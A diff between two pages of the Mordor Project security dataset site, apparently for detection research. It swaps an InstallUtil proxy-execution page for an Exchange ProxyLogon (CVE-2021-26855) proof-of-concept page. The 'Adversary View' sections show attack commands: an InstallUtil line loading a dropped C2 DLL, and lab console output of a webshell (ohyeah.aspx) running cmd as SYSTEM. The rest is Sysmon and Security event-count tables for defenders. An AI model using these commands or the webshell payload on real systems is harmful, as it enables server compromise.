@@ -6,7 +6,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Covenant ShellCmd InstallUtil &#8212; The Mordor Project</title>
+    <title>Exchange ProxyLogon SSRF RCE Vuln POC &#8212; The Mordor Project</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous">
     <link href="../../../../_static/css/index.css" rel="stylesheet">
     <link rel="stylesheet" href="../../../../_static/sphinx-book-theme.css" type="text/css" />
@@ -33,22 +33,22 @@
         const thebe_selector_output = ".output,.cell_output"
     </script>
     <script async="async" src="../../../../_static/sphinx-thebe.js"></script>
-    <link rel="canonical" href="https://mordordatasets.com/notebooks/small/windows/02_execution/SDWIN-191027223020.html" />
+    <link rel="canonical" href="https://mordordatasets.com/notebooks/small/windows/03_persistence/SDWIN-210314014019.html" />
     <link rel="shortcut icon" href="../../../../_static/favicon.ico"/>
     <link rel="index" title="Index" href="../../../../genindex.html" />
     <link rel="search" title="Search" href="../../../../search.html" />
-    <link rel="next" title="Persistence" href="../03_persistence/persistence.html" />
-    <link rel="prev" title="Empire VBS Execution" href="SDWIN-190518182022.html" />
+    <link rel="next" title="Empire Elevated Registry Run Keys" href="SDWIN-200722001847.html" />
+    <link rel="prev" title="Logon Scripts via UserInitMprLogonScript" href="SDWIN-201019224718.html" />
 
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="docsearch:language" content="en">
 
 
 <!-- Opengraph tags -->
-<meta property="og:url"         content="https://mordordatasets.com/notebooks/small/windows/02_execution/SDWIN-191027223020.html" />
+<meta property="og:url"         content="https://mordordatasets.com/notebooks/small/windows/03_persistence/SDWIN-210314014019.html" />
 <meta property="og:type"        content="article" />
-<meta property="og:title"       content="Covenant ShellCmd InstallUtil" />
-<meta property="og:description" content="Covenant ShellCmd InstallUtil  Metadata          Author  Roberto Rodriguez @Cyb3rWard0g  Creation Date  2019/10/27  Modification Date  2020/09/19  Tactics  [‘TA" />
+<meta property="og:title"       content="Exchange ProxyLogon SSRF RCE Vuln POC" />
+<meta property="og:description" content="Exchange ProxyLogon SSRF RCE Vuln POC  Metadata          Author  Roberto Rodriguez @Cyb3rWard0g  Creation Date  2021/03/14  Modification Date  2021/03/14  Tacti" />
 <meta property="og:image"       content="https://mordordatasets.com/_static/logo.png" />
 
 <meta name="twitter:card" content="summary" />
@@ -132,39 +132,116 @@
    Windows
   </a>
   <ul class="current">
-   <li class="toctree-l2 current active">
-    <a class="reference internal" href="execution.html">
+   <li class="toctree-l2">
+    <a class="reference internal" href="../02_execution/execution.html">
      Execution
     </a>
-    <ul class="current">
+    <ul>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-200806115603.html">
+      <a class="reference internal" href="../02_execution/SDWIN-200806115603.html">
        Covenant PowerShell Remoting Command
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-201029202324.html">
+      <a class="reference internal" href="../02_execution/SDWIN-201029202324.html">
        SharpView PCRE.NET
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-201009173318.html">
+      <a class="reference internal" href="../02_execution/SDWIN-201009173318.html">
        Covenant Remote WMI Wbemcomn DLL Hijacking
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-200806035621.html">
+      <a class="reference internal" href="../02_execution/SDWIN-200806035621.html">
        Covenant SharpWMI Exec
       </a>
      </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../02_execution/SDWIN-201219075059.html">
+       Remote Scheduled Task Modification
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../02_execution/SDWIN-190518211456.html">
+       Empire Invoke PSRemoting
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../02_execution/SDWIN-201219070027.html">
+       Remote Scheduled Task Creation
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../02_execution/SDWIN-201029001615.html">
+       Python HTTP Server
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../02_execution/SDWIN-210314014019.html">
+       Exchange ProxyLogon SSRF RCE Vuln POC
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../02_execution/SDWIN-190518211052.html">
+       Empire Invoke DCOM ShellWindows
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../02_execution/SDWIN-200724174200.html">
+       Covenant Remote WMI Eventing ActiveScriptEventConsumers
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../02_execution/SDWIN-190518210652.html">
+       Empire Invoke PsExec
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../02_execution/SDWIN-201102041306.html">
+       PowerShell HTTP Listener
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../02_execution/SDWIN-190518213907.html">
+       Empire Invoke Execute MSBuild
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../02_execution/SDWIN-200914080546.html">
+       Empire Remote WMIC Add User
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../02_execution/SDWIN-200921001437.html">
+       Empire Invoke WMI
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../02_execution/SDWIN-190518182022.html">
+       Empire VBS Execution
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../02_execution/SDWIN-191027223020.html">
+       Covenant ShellCmd InstallUtil
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toctree-l2 current active">
+    <a class="reference internal" href="persistence.html">
+     Persistence
+    </a>
+    <ul class="current">
      <li class="toctree-l3">
       <a class="reference internal" href="SDWIN-201219075059.html">
        Remote Scheduled Task Modification
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190518211456.html">
-       Empire Invoke PSRemoting
+      <a class="reference internal" href="SDWIN-190319023812.html">
+       Empire Userland Registry Run Keys
       </a>
      </li>
      <li class="toctree-l3">
@@ -173,124 +250,47 @@
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-201029001615.html">
-       Python HTTP Server
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-210314014019.html">
-       Exchange ProxyLogon SSRF RCE Vuln POC
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190518211052.html">
-       Empire Invoke DCOM ShellWindows
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-200724174200.html">
-       Covenant Remote WMI Eventing ActiveScriptEventConsumers
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190518210652.html">
-       Empire Invoke PsExec
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-201102041306.html">
-       PowerShell HTTP Listener
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190518213907.html">
-       Empire Invoke Execute MSBuild
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-200914080546.html">
-       Empire Remote WMIC Add User
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-200921001437.html">
-       Empire Invoke WMI
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190518182022.html">
-       Empire VBS Execution
-      </a>
-     </li>
-     <li class="toctree-l3 current active">
-      <a class="current reference internal" href="#">
-       Covenant ShellCmd InstallUtil
-      </a>
-     </li>
-    </ul>
-   </li>
-   <li class="toctree-l2">
-    <a class="reference internal" href="../03_persistence/persistence.html">
-     Persistence
-    </a>
-    <ul>
-     <li class="toctree-l3">
-      <a class="reference internal" href="../03_persistence/SDWIN-201219075059.html">
-       Remote Scheduled Task Modification
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="../03_persistence/SDWIN-190319023812.html">
-       Empire Userland Registry Run Keys
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="../03_persistence/SDWIN-201219070027.html">
-       Remote Scheduled Task Creation
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="../03_persistence/SDWIN-190319024742.html">
+      <a class="reference internal" href="SDWIN-190319024742.html">
        Empire Userland Scheduled Tasks
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../03_persistence/SDWIN-201023023651.html">
+      <a class="reference internal" href="SDWIN-201023023651.html">
        Bitsadmin Download Malicious File
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../03_persistence/SDWIN-190518184306.html">
+      <a class="reference internal" href="SDWIN-190518184306.html">
        Empire Elevated WMI Eventing
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../03_persistence/SDWIN-200921175806.html">
+      <a class="reference internal" href="SDWIN-200921175806.html">
        Empire Elevated Scheduled Tasks
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../03_persistence/SDWIN-201019224718.html">
+      <a class="reference internal" href="SDWIN-201019224718.html">
        Logon Scripts via UserInitMprLogonScript
       </a>
      </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="../03_persistence/SDWIN-210314014019.html">
+     <li class="toctree-l3 current active">
+      <a class="current reference internal" href="#">
        Exchange ProxyLogon SSRF RCE Vuln POC
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../03_persistence/SDWIN-200722001847.html">
+      <a class="reference internal" href="SDWIN-200722001847.html">
        Empire Elevated Registry Run Keys
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../03_persistence/SDWIN-190403133337.html">
+      <a class="reference internal" href="SDWIN-190403133337.html">
        IKEEXT Remote Service DLL Hijack
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../03_persistence/SDWIN-201021204544.html">
+      <a class="reference internal" href="SDWIN-201021204544.html">
        Service Modification Fax
       </a>
      </li>
@@ -857,7 +857,7 @@
         <!-- ipynb file if we had a myst markdown file -->
         
         <!-- Download raw file -->
-        <a class="dropdown-buttons" href="../../../../_sources/notebooks/small/windows/02_execution/SDWIN-191027223020.ipynb"><button type="button"
+        <a class="dropdown-buttons" href="../../../../_sources/notebooks/small/windows/03_persistence/SDWIN-210314014019.ipynb"><button type="button"
                 class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
                 data-placement="left">.ipynb</button></a>
         <!-- Download PDF via print -->
@@ -877,10 +877,10 @@
                 data-toggle="tooltip" data-placement="left" title="Source repository"><i
                     class="fab fa-github"></i>repository</button></a>
         <a class="issues-button"
-            href="https://github.com/OTRF/mordor/issues/new?title=Issue%20on%20page%20%2Fnotebooks/small/windows/02_execution/SDWIN-191027223020.html&body=Your%20issue%20content%20here."><button
+            href="https://github.com/OTRF/mordor/issues/new?title=Issue%20on%20page%20%2Fnotebooks/small/windows/03_persistence/SDWIN-210314014019.html&body=Your%20issue%20content%20here."><button
                 type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="left"
                 title="Open an issue"><i class="fas fa-lightbulb"></i>open issue</button></a>
-        <a class="edit-button" href="https://github.com/OTRF/mordor/edit/master/docs/notebooks/small/windows/02_execution/SDWIN-191027223020.ipynb"><button
+        <a class="edit-button" href="https://github.com/OTRF/mordor/edit/master/docs/notebooks/small/windows/03_persistence/SDWIN-210314014019.ipynb"><button
                 type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="left"
                 title="Edit this page"><i class="fas fa-pencil-alt"></i>suggest edit</button></a>
     </div>
@@ -899,7 +899,7 @@
         aria-label="Launch interactive content"><i class="fas fa-rocket"></i></button>
     <div class="dropdown-buttons">
         
-        <a class="binder-button" href="https://mybinder.org/v2/gh/OTRF/mordor/master?urlpath=tree/docs/notebooks/small/windows/02_execution/SDWIN-191027223020.ipynb"><button type="button"
+        <a class="binder-button" href="https://mybinder.org/v2/gh/OTRF/mordor/master?urlpath=tree/docs/notebooks/small/windows/03_persistence/SDWIN-210314014019.ipynb"><button type="button"
                 class="btn btn-secondary topbarbtn" title="Launch Binder" data-toggle="tooltip"
                 data-placement="left"><img class="binder-button-logo"
                     src="../../../../_static/images/logo_binder.svg"
@@ -907,7 +907,7 @@
         
         
         
-        <a class="colab-button" href="https://colab.research.google.com/github/OTRF/mordor/blob/master/docs/notebooks/small/windows/02_execution/SDWIN-191027223020.ipynb"><button type="button" class="btn btn-secondary topbarbtn"
+        <a class="colab-button" href="https://colab.research.google.com/github/OTRF/mordor/blob/master/docs/notebooks/small/windows/03_persistence/SDWIN-210314014019.ipynb"><button type="button" class="btn btn-secondary topbarbtn"
                 title="Launch Colab" data-toggle="tooltip" data-placement="left"><img class="colab-button-logo"
                     src="../../../../_static/images/logo_colab.png"
                     alt="Interact on Colab">Colab</button></a>
@@ -990,8 +990,8 @@
         
               <div>
                 
-  <div class="section" id="covenant-shellcmd-installutil">
-<h1>Covenant ShellCmd InstallUtil<a class="headerlink" href="#covenant-shellcmd-installutil" title="Permalink to this headline">¶</a></h1>
+  <div class="section" id="exchange-proxylogon-ssrf-rce-vuln-poc">
+<h1>Exchange ProxyLogon SSRF RCE Vuln POC<a class="headerlink" href="#exchange-proxylogon-ssrf-rce-vuln-poc" title="Permalink to this headline">¶</a></h1>
 <div class="section" id="metadata">
 <h2>Metadata<a class="headerlink" href="#metadata" title="Permalink to this headline">¶</a></h2>
 <table class="colwidths-auto table">
@@ -1005,26 +1005,26 @@
 <td class="text-align:left"><p>Roberto Rodriguez &#64;Cyb3rWard0g</p></td>
 </tr>
 <tr class="row-odd"><td class="text-align:left"><p>Creation Date</p></td>
-<td class="text-align:left"><p>2019/10/27</p></td>
+<td class="text-align:left"><p>2021/03/14</p></td>
 </tr>
 <tr class="row-even"><td class="text-align:left"><p>Modification Date</p></td>
-<td class="text-align:left"><p>2020/09/19</p></td>
+<td class="text-align:left"><p>2021/03/14</p></td>
 </tr>
 <tr class="row-odd"><td class="text-align:left"><p>Tactics</p></td>
-<td class="text-align:left"><p>[‘<a class="reference external" href="https://attack.mitre.org/tactics/TA0005">TA0005</a>’, ‘<a class="reference external" href="https://attack.mitre.org/tactics/TA0002">TA0002</a>’]</p></td>
+<td class="text-align:left"><p>[‘<a class="reference external" href="https://attack.mitre.org/tactics/TA0003">TA0003</a>’, ‘<a class="reference external" href="https://attack.mitre.org/tactics/TA0002">TA0002</a>’]</p></td>
 </tr>
 <tr class="row-even"><td class="text-align:left"><p>Techniques</p></td>
-<td class="text-align:left"><p>[‘<a class="reference external" href="https://attack.mitre.org/techniques/T1218/004">T1218.004</a>’]</p></td>
+<td class="text-align:left"><p>[‘<a class="reference external" href="https://attack.mitre.org/techniques/T1505/003">T1505.003</a>’]</p></td>
 </tr>
 <tr class="row-odd"><td class="text-align:left"><p>Tags</p></td>
-<td class="text-align:left"><p>[‘InstallUtil’, ‘LOLBin’]</p></td>
+<td class="text-align:left"><p>None</p></td>
 </tr>
 </tbody>
 </table>
 </div>
 <div class="section" id="dataset-description">
 <h2>Dataset Description<a class="headerlink" href="#dataset-description" title="Permalink to this headline">¶</a></h2>
-<p>This dataset represents adversaries proxy executing code through InstallUtil, a trusted Windows utility.</p>
+<p>This dataset represents the execution of a public POC to abuse Exchange vulnerabilities (CVE-2021-26855 server-side request forgery (SSRF) vulnerability)</p>
 </div>
 <div class="section" id="datasets-downloads">
 <h2>Datasets Downloads<a class="headerlink" href="#datasets-downloads" title="Permalink to this headline">¶</a></h2>
@@ -1036,7 +1036,7 @@
 </thead>
 <tbody>
 <tr class="row-even"><td class="text-align:left"><p>Host</p></td>
-<td class="text-align:left"><p><a class="reference external" href="https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/host/covenant_installutil.zip">https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/host/covenant_installutil.zip</a></p></td>
+<td class="text-align:left"><p><a class="reference external" href="https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/host/proxylogon_ssrf_rce_poc.zip">https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/host/proxylogon_ssrf_rce_poc.zip</a></p></td>
 </tr>
 </tbody>
 </table>
@@ -1065,17 +1065,41 @@
 </tr>
 </thead>
 <tbody>
-<tr class="row-even"><td class="text-align:left"><p>Mordor shire</p></td>
-<td class="text-align:left"><p>C2</p></td>
-<td class="text-align:left"><p><a class="reference external" href="https://github.com/cobbr/Covenant/blob/7555b19ffb9401c0e37094c25e404a640b1688d7/Covenant/Data/Tasks/SharpSploit.Execution.yaml#L96">ShellCmd</a></p></td>
+<tr class="row-even"><td class="text-align:left"><p>Lab VM</p></td>
+<td class="text-align:left"><p>Manual</p></td>
+<td class="text-align:left"><p><span class="xref myst">cmd</span></p></td>
 </tr>
 </tbody>
 </table>
 </div>
 <div class="section" id="adversary-view">
 <h2>Adversary View<a class="headerlink" href="#adversary-view" title="Permalink to this headline">¶</a></h2>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Upload</span> <span class="n">Task</span><span class="p">:</span> <span class="n">GruntHTTP</span><span class="o">.</span><span class="n">dll</span> <span class="o">-&gt;</span> <span class="n">C</span><span class="p">:</span>\<span class="n">ProgramData</span>\<span class="n">GruntHTTP</span><span class="o">.</span><span class="n">dll</span>
-<span class="p">(</span><span class="n">wardog</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">ShellCmd</span> <span class="o">/</span><span class="n">shellcommand</span><span class="p">:</span><span class="s2">&quot;C:\Windows\Microsoft.NET\Framework64</span><span class="se">\v</span><span class="s2">4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /u c:\ProgramData\GruntHTTP.dll&quot;</span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>C:\Users\wardog.MXS01\Documents&gt;
+C:\Users\wardog.MXS01\Documents&gt;python public-poc.py localhost wardog@azsentinel.local
+Attacking target localhost
+=============================
+Got DN: /o=azsentinel/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=6beef80bd6d14a68b9ae39df7f27a8cc-wardog
+Got SID: S-1-5-21-594047938-393122191-2580508586-500
+Got session id: e243cd06-1093-40d4-829c-63f3b9caea9b
+Got canary: pYoEXlKOqkGQMt3Dv3qJUExebVlG6NgI3c_XeQNd-VRV8lo6E5zskoLPJB0uOOGITLTC08eVUkk.
+Got OAB id: becafe73-b0c1-4f36-8df4-85f682840ef4
+Ready!
+
+Testing command:
+===============
+POST  shell:https://localhost/owa/auth/ohyeah.aspx
+code&quot;:&quot;Response.Write(new ActiveXObject(&quot;WScript.Shell&quot;).exec(&quot;cmd /c whoami&quot;).StdOut.ReadAll());
+
+
+[*] Waiting for ohyeah.aspx to be available..
+[*] Waiting for ohyeah.aspx to be available..
+
+Results:
+========
+nt authority\system
+
+
+C:\Users\wardog.MXS01\Documents&gt;
 </pre></div>
 </div>
 </div>
@@ -1096,7 +1120,7 @@
 <h3>Download &amp; Process Mordor File<a class="headerlink" href="#download-process-mordor-file" title="Permalink to this headline">¶</a></h3>
 <div class="cell docutils container">
 <div class="cell_input docutils container">
-<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/host/covenant_installutil.zip&quot;</span>
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/host/proxylogon_ssrf_rce_poc.zip&quot;</span>
 <span class="n">registerMordorSQLTable</span><span class="p">(</span><span class="n">spark</span><span class="p">,</span> <span class="n">mordor_file</span><span class="p">,</span> <span class="s2">&quot;mordorTable&quot;</span><span class="p">)</span>
 </pre></div>
 </div>
@@ -1129,30 +1153,30 @@
 </div>
 </div>
 <div class="cell_output docutils container">
-<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>+---------------------------+------------------------------------+-------+-----+
-|Hostname                   |Channel                             |EventID|count|
-+---------------------------+------------------------------------+-------+-----+
-|WORKSTATION5.theshire.local|Microsoft-Windows-Sysmon/Operational|13     |313  |
-|WORKSTATION5.theshire.local|Microsoft-Windows-Sysmon/Operational|10     |219  |
-|WORKSTATION6.theshire.local|Microsoft-Windows-Sysmon/Operational|13     |213  |
-|WORKSTATION5.theshire.local|Microsoft-Windows-Sysmon/Operational|7      |120  |
-|WORKSTATION6.theshire.local|Microsoft-Windows-Sysmon/Operational|10     |112  |
-|WORKSTATION5.theshire.local|Microsoft-Windows-Sysmon/Operational|12     |82   |
-|WORKSTATION5.theshire.local|Security                            |4658   |71   |
-|MORDORDC.theshire.local    |Security                            |4658   |69   |
-|WORKSTATION5.theshire.local|Security                            |5158   |41   |
-|WORKSTATION6.theshire.local|security                            |5158   |38   |
-|MORDORDC.theshire.local    |Security                            |5156   |37   |
-|WORKSTATION5.theshire.local|Security                            |4690   |36   |
-|WORKSTATION5.theshire.local|Security                            |4656   |36   |
-|MORDORDC.theshire.local    |Security                            |4690   |34   |
-|MORDORDC.theshire.local    |Security                            |4663   |34   |
-|MORDORDC.theshire.local    |Security                            |4656   |34   |
-|WORKSTATION6.theshire.local|Microsoft-Windows-Sysmon/Operational|12     |32   |
-|MORDORDC.theshire.local    |Security                            |5158   |29   |
-|WORKSTATION5.theshire.local|Security                            |4663   |26   |
-|WORKSTATION5.theshire.local|Security                            |5156   |20   |
-+---------------------------+------------------------------------+-------+-----+
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>+----------------------+---------------------------------------------------+-------+-----+
+|Hostname              |Channel                                            |EventID|count|
++----------------------+---------------------------------------------------+-------+-----+
+|MXS01.azsentinel.local|Microsoft-Windows-Sysmon/Operational               |10     |3626 |
+|MXS01.azsentinel.local|Security                                           |4658   |2398 |
+|MXS01.azsentinel.local|Security                                           |4656   |1199 |
+|MXS01.azsentinel.local|Security                                           |4690   |1199 |
+|MXS01.azsentinel.local|Microsoft-Windows-Sysmon/Operational               |7      |427  |
+|MXS01.azsentinel.local|Microsoft-Windows-Sysmon/Operational               |11     |301  |
+|MXS01.azsentinel.local|Microsoft-Exchange-ActiveMonitoring/MonitorResult  |3      |293  |
+|MXS01.azsentinel.local|Microsoft-Exchange-ActiveMonitoring/ResponderResult|4      |167  |
+|MXS01.azsentinel.local|Security                                           |5156   |132  |
+|MXS01.azsentinel.local|Microsoft-Windows-Sysmon/Operational               |12     |120  |
+|MXS01.azsentinel.local|Microsoft-Windows-Sysmon/Operational               |3      |117  |
+|MXS01.azsentinel.local|Security                                           |5158   |85   |
+|MXS01.azsentinel.local|Security                                           |4703   |72   |
+|MXS01.azsentinel.local|Microsoft-Exchange-ActiveMonitoring/ProbeResult    |2      |57   |
+|MXS01.azsentinel.local|Microsoft-Windows-Sysmon/Operational               |13     |37   |
+|MXS01.azsentinel.local|Security                                           |4627   |21   |
+|MXS01.azsentinel.local|Security                                           |4624   |21   |
+|MXS01.azsentinel.local|Security                                           |4985   |18   |
+|MXS01.azsentinel.local|Application                                        |2303   |17   |
+|MXS01.azsentinel.local|Security                                           |4663   |16   |
++----------------------+---------------------------------------------------+-------+-----+
 only showing top 20 rows
 </pre></div>
 </div>
@@ -1175,7 +1199,7 @@ only showing top 20 rows
         },
         kernelOptions: {
             kernelName: "pyspark3",
-            path: "./notebooks/small/windows/02_execution"
+            path: "./notebooks/small/windows/03_persistence"
         },
         predefinedOutput: true
     }
@@ -1190,8 +1214,8 @@ only showing top 20 rows
     
     <div class='prev-next-bottom'>
         
-    <a class='left-prev' id="prev-link" href="SDWIN-190518182022.html" title="previous page">Empire VBS Execution</a>
-    <a class='right-next' id="next-link" href="../03_persistence/persistence.html" title="next page">Persistence</a>
+    <a class='left-prev' id="prev-link" href="SDWIN-201019224718.html" title="previous page">Logon Scripts via UserInitMprLogonScript</a>
+    <a class='right-next' id="next-link" href="SDWIN-200722001847.html" title="next page">Empire Elevated Registry Run Keys</a>
 
     </div>
     <footer class="footer mt-5 mt-md-0">
